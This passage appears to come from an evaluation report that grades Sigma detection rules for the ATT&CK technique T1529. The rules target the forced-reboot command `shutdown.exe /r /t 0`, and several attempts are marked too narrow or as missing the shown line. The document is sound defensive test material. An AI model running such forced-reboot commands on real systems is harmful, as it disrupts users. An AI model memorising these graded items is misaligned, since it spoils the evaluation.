        CommandLine|contains|windash|all:
            - '/r'
            - '/t 0'
    condition: selection
```

#### `T1529` (Repeat 2) - Verdict: `TOO_NARROW`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|windash|all:
            - '/r'
            - '/t 0'
    condition: selection
```

#### `T1529` (Repeat 3) - Verdict: `MISSED_SHOWN`

- **Shown line**: `C:\Windows\System32\shutdown.exe /r /t 0`
- **Variant line**: `C:\Windows\System32\shutdown.exe /r /t 30`
- **Detection Block**:
```yaml
detection:
    selection:
        Image|endswith: '\shutdown.exe'
        CommandLine|contains|all:
            - '/r'
            - '/t:0'
    condition: selection
```

